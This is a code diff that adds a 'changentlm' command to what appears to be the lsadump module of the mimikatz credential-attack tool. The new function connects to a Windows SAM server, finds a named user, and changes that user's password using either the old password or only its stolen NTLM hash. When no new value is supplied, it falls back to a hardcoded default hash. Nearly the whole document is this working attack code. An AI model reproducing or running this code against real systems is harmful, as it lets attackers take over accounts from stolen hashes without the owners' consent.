@@ -15,6 +15,7 @@ const KUHL_M_C kuhl_m_c_lsadump[] = {
 	{kuhl_m_lsadump_rpdata,		L"rpdata",		NULL},
 	{kuhl_m_lsadump_dcsync,		L"dcsync",		L"Ask a DC to synchronize an object"},
 	{kuhl_m_lsadump_setntlm,	L"setntlm",		L"Ask a server to set a new password/ntlm for one user"},
+	{kuhl_m_lsadump_changentlm,	L"changentlm",	L"Ask a server to set a new password/ntlm for one user"},
 	{kuhl_m_lsadump_netsync,	L"netsync",		L"Ask a DC to send current and previous NTLM hash of DC/SRV/WKS"},
 };
 
@@ -2363,6 +2364,136 @@ NTSTATUS kuhl_m_lsadump_setntlm(int argc, wchar_t * argv[])
 				SamCloseHandle(hServerHandle);
 			}
 			else PRINT_ERROR(L"SamConnect: %08x\n", status);
+		}
+	}
+	else PRINT_ERROR(L"Argument /user: is needed\n");
+	return STATUS_SUCCESS;
+}
+
+/*	This function `changentlm` is based on another crazy idea of
+	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
+*/
+NTSTATUS kuhl_m_lsadump_changentlm(int argc, wchar_t * argv[])
+{
+	NTSTATUS status0 = STATUS_DATA_ERROR, status1 = STATUS_DATA_ERROR;
+	LSA_UNICODE_STRING serverName, userName, password;
+	SAMPR_HANDLE hServerHandle, hDomainHandle, hUserHandle;
+	DWORD i, domainEnumerationContext = 0, domainCountRetourned, *pRid = NULL, *pUse = NULL;
+	PSAMPR_RID_ENUMERATION pEnumDomainBuffer;
+	PSID domainSid;
+	PCWCHAR szUser, szServer = NULL, szPassword;
+	BYTE oldNtlm[LM_NTLM_HASH_LENGTH], newNtlm[LM_NTLM_HASH_LENGTH] = {0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6}, emptyLM[LM_NTLM_HASH_LENGTH] = {0};
+
+	if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
+	{
+		RtlInitUnicodeString(&userName, szUser);
+		kull_m_string_args_byName(argc, argv, L"server", &szServer, NULL);
+		RtlInitUnicodeString(&serverName, szServer ? szServer : L"");
+		kprintf(L"Target server: %wZ\n", &serverName);
+		kprintf(L"Target user  : %wZ\n", &userName);
+		
+		
+		if(kull_m_string_args_byName(argc, argv, L"oldpassword", &szPassword, NULL))
+		{
+			RtlInitUnicodeString(&password, szPassword);
+			status0 = RtlDigestNTLM(&password, oldNtlm);
+			if(!NT_SUCCESS(status0))
+				PRINT_ERROR(L"Unable to digest NTLM hash from old password: %08x\n", status0);
+		}
+		else if(kull_m_string_args_byName(argc, argv, L"oldntlm", &szPassword, NULL) || kull_m_string_args_byName(argc, argv, L"old", &szPassword, NULL))
+		{
+			status0 = kull_m_string_stringToHex(szPassword, oldNtlm, sizeof(oldNtlm)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
+			if(!NT_SUCCESS(status0))
+				PRINT_ERROR(L"Unable to convert \'%s\' to old NTLM hash (16 bytes)\n", szPassword);
+		}
+		else PRINT_ERROR(L"Argument /oldpassword: or /oldntlm: is needed\n");
+
+
+		if(kull_m_string_args_byName(argc, argv, L"newpassword", &szPassword, NULL))
+		{
+			RtlInitUnicodeString(&password, szPassword);
+			status1 = RtlDigestNTLM(&password, newNtlm);
+			if(!NT_SUCCESS(status1))
+				PRINT_ERROR(L"Unable to digest NTLM hash from new password: %08x\n", status0);
+		}
+		else if(kull_m_string_args_byName(argc, argv, L"newntlm", &szPassword, NULL) || kull_m_string_args_byName(argc, argv, L"new", &szPassword, NULL))
+		{
+			status1 = kull_m_string_stringToHex(szPassword, newNtlm, sizeof(newNtlm)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
+			if(!NT_SUCCESS(status1))
+				PRINT_ERROR(L"Unable to convert \'%s\' to new NTLM hash (16 bytes)\n", szPassword);
+		}
+		else
+		{
+			kprintf(L"** No new credentials provided, will use the default one **\n");
+			status1 = STATUS_SUCCESS;
+		}
+
+		if(NT_SUCCESS(status0) && NT_SUCCESS(status1))
+		{
+			kprintf(L"OLD NTLM     : ");
+			kull_m_string_wprintf_hex(oldNtlm, sizeof(oldNtlm), 0);
+			kprintf(L"\nNEW NTLM     : ");
+			kull_m_string_wprintf_hex(newNtlm, sizeof(newNtlm), 0);
+			kprintf(L"\n\n");
+			status0 = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
+			if(NT_SUCCESS(status0))
+			{
+				do
+				{
+					status1 = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
+					if(NT_SUCCESS(status1) || status1 == STATUS_MORE_ENTRIES)
+					{
+						for(i = 0; i < domainCountRetourned; i++)
+						{
+							if(RtlEqualUnicodeString(&pEnumDomainBuffer[i].Name, &uBuiltin, TRUE))
+								continue;
+							kprintf(L"Domain name  : %wZ\n", &pEnumDomainBuffer[i].Name);
+							status0 = SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &domainSid);
+							if(NT_SUCCESS(status0))
+							{
+								kprintf(L"Domain SID   : ");
+								kull_m_string_displaySID(domainSid);
+								kprintf(L"\n");
+								status0 = SamOpenDomain(hServerHandle, DOMAIN_LOOKUP, domainSid, &hDomainHandle);
+								if(NT_SUCCESS(status0))
+								{
+									status0 = SamLookupNamesInDomain(hDomainHandle, 1, &userName, &pRid, &pUse);
+									if(NT_SUCCESS(status0))
+									{
+										kprintf(L"User RID     : %u\n", pRid[0]);
+										status0 = SamOpenUser(hDomainHandle, USER_CHANGE_PASSWORD, pRid[0], &hUserHandle);
+										if(NT_SUCCESS(status0))
+										{
+											status0 = SamiChangePasswordUser(hUserHandle, FALSE, emptyLM, emptyLM, TRUE, oldNtlm, newNtlm);
+											if(NT_SUCCESS(status0))
+												kprintf(L"\n>> Change password is a success!\n");
+											else if(status0 == STATUS_WRONG_PASSWORD)
+												PRINT_ERROR(L"Bad old NTLM hash or password!\n");
+											else if(status0 == STATUS_PASSWORD_RESTRICTION)
+												PRINT_ERROR(L"Bad new NTLM hash or password! (restriction)\n");
+											else PRINT_ERROR(L"SamiChangePasswordUser: %08x\n", status0);
+											SamCloseHandle(hUserHandle);
+										}
+										else PRINT_ERROR(L"SamOpenUser: %08x\n", status0);
+										SamFreeMemory(pRid);
+										SamFreeMemory(pUse);
+									}
+									else PRINT_ERROR(L"SamLookupNamesInDomain: %08x\n", status0);
+									SamCloseHandle(hDomainHandle);
+								}
+								else PRINT_ERROR(L"SamOpenDomain: %08x\n", status0);
+								SamFreeMemory(domainSid);
+							}
+							else PRINT_ERROR(L"SamLookupDomainInSamServer: %08x\n", status0);
+						}
+						SamFreeMemory(pEnumDomainBuffer);
+					}
+					else PRINT_ERROR(L"SamEnumerateDomainsInSamServer: %08x\n", status1);
+				}
+				while(status1 == STATUS_MORE_ENTRIES);
+				SamCloseHandle(hServerHandle);
+			}
+			else PRINT_ERROR(L"SamConnect: %08x\n", status0);
 		}
 	}
 	else PRINT_ERROR(L"Argument /user: is needed\n");
